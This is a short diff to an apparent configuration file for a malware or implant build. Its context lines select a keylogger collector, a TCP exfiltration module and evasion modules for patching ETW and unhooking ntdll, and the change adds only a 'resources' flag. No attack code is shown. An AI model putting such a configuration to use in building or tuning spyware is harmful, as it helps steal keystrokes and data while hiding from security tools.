@@ -13,6 +13,8 @@ keylogger: collectors/keylogger_poll
 exfil: exfil/tcp_flush
 arch: arch/keylogger
 
+resources: true
+
 evasion:
   - evasion/etw_patch
   - evasion/unhook_ntdll
